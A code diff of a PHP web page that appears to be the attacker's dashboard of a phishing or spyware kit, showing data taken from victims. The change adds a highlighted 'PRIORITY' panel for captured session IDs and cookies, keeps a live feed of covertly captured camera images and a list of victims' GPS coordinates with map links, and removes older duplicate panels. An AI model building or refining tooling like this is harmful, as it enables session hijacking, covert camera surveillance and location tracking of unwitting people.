@@ -51,18 +51,59 @@
             color: #00ff88; 
             font-size: 1.3em;
         }
+        .card.priority {
+            border: 2px solid #ff0088;
+            box-shadow: 0 8px 16px rgba(255,0,136,0.3);
+        }
+        .card.priority h2 {
+            border-bottom: 2px solid #ff0088;
+            color: #ff0088;
+        }
         pre { 
             background-color: #0a0a0a; 
             padding: 15px; 
             border-radius: 6px; 
             overflow-x: auto; 
             white-space: pre-wrap; 
-            max-height: 300px; 
+            max-height: 400px; 
             overflow-y: auto; 
             color: #00ff00; 
             font-family: 'Consolas', 'Courier New', monospace;
             font-size: 0.85em;
             line-height: 1.5;
+        }
+        .cookie-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            font-size: 0.85em;
+        }
+        .cookie-table tr {
+            border-bottom: 1px solid #333;
+        }
+        .cookie-table td {
+            padding: 8px;
+            color: #aaa;
+        }
+        .cookie-table td:first-child {
+            color: #ff0088;
+            font-weight: bold;
+            width: 35%;
+            word-break: break-word;
+        }
+        .cookie-table td:last-child {
+            color: #00ff88;
+            font-family: 'Consolas', monospace;
+            word-break: break-all;
+        }
+        .session-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            background: #ff0088;
+            color: #fff;
+            border-radius: 10px;
+            font-size: 0.7em;
+            margin-left: 5px;
         }
         .gallery { 
             display: grid;
@@ -129,21 +170,6 @@
             font-weight: bold;
             margin-left: 10px;
         }
-        .cookies-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 10px;
-        }
-        .cookies-table td {
-            padding: 8px;
-            border-bottom: 1px solid #333;
-            color: #aaa;
-        }
-        .cookies-table td:first-child {
-            color: #00ff88;
-            font-weight: bold;
-            width: 30%;
-        }
         ::-webkit-scrollbar {
             width: 8px;
             height: 8px;
@@ -162,7 +188,6 @@
     </style>
     <script>
         setInterval(() => {
-            // Reload only the dynamic content, not the entire page
             location.reload();
         }, 3000); // Auto-refresh every 3 seconds
     </script>
@@ -173,6 +198,18 @@
     <button class="refresh-btn" onclick="window.location.reload()">🔄 Manual Refresh</button>
     
     <div class="container">
+        <!-- Session IDs & Cookies (PRIORITY) -->
+        <div class="card priority">
+            <h2>🔑 Session IDs & Cookies<span class="session-badge">PRIORITY</span></h2>
+            <pre><?php 
+                if (file_exists('device_info.txt')) {
+                    echo htmlspecialchars(file_get_contents('device_info.txt'));
+                } else {
+                    echo 'No session data captured yet...';
+                }
+            ?></pre>
+        </div>
+
         <!-- Live Video Feed -->
         <div class="card">
             <h2>📹 Live Camera Feed<span class="status-badge">LIVE</span></h2>
@@ -180,7 +217,7 @@
                 <?php 
                     $images = glob("*.png");
                     if ($images) {
-                        rsort($images); // Newest first
+                        rsort($images);
                         echo "<img src='{$images[0]}?t=" . time() . "' alt='Live Feed'>";
                     } else {
                         echo "<p style='color:#666'>Waiting for camera activation...</p>";
@@ -204,44 +241,18 @@
             ?></pre>
         </div>
 
-        <!-- Cookies & Browser Data -->
-        <div class="card">
-            <h2>🍪 Cookies & Browser Data</h2>
-            <pre><?php 
-                if (file_exists('device_info.txt')) {
-                    $deviceData = file_get_contents('device_info.txt');
-                    echo htmlspecialchars($deviceData);
-                } else {
-                    echo 'No cookies captured yet...';
-                }
-            ?></pre>
-        </div>
-
-        <!-- Device Information -->
-        <div class="card">
-            <h2>📱 Device Details</h2>
-            <pre><?php 
-                if (file_exists('device_info.txt')) {
-                    echo htmlspecialchars(file_get_contents('device_info.txt'));
-                } else {
-                    echo 'No device data yet...';
-                }
-            ?></pre>
-        </div>
-
         <!-- GPS Location -->
         <div class="card">
             <h2>📍 GPS Coordinates</h2>
             <pre><?php 
                 $locFiles = glob("saved_locations/*.txt");
                 if ($locFiles) {
-                    rsort($locFiles); // Newest first
+                    rsort($locFiles);
                     foreach($locFiles as $file) {
                         echo "📌 " . basename($file) . "\n";
                         $content = file_get_contents($file);
                         echo htmlspecialchars($content) . "\n";
                         
-                        // Extract coordinates for Google Maps link
                         if (preg_match('/Latitude:\s*([-\d.]+)/', $content, $lat) && 
                             preg_match('/Longitude:\s*([-\d.]+)/', $content, $lon)) {
                             echo "🗺️  Google Maps: https://www.google.com/maps?q={$lat[1]},{$lon[1]}\n";
@@ -261,7 +272,7 @@
                 <?php 
                     $images = glob("*.png");
                     if ($images) {
-                        rsort($images); // Newest first
+                        rsort($images);
                         foreach($images as $image) {
                             echo "<a href='$image' target='_blank'><img src='$image' alt='Captured' title='" . basename($image) . "'></a>";
                         }
